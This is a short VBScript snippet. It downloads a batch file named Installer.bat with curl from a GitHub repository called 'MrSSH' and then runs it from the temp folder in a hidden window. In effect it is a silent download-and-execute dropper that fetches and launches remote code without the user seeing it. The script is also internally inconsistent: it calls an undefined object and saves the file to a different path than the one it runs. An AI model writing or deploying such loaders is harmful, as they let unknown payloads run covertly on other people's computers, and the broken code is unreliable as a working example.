Set WshShell = CreateObject("WScript.Shell") 
oShell.run "cmd curl https://raw.githubusercontent.com/dh3b/MrSSH/main/FIles/Installer.bat -o Installer.bat"
WshShell.Run chr(34) & "%temp%\Installer.bat" & Chr(34), 0
Set WshShell = Nothing
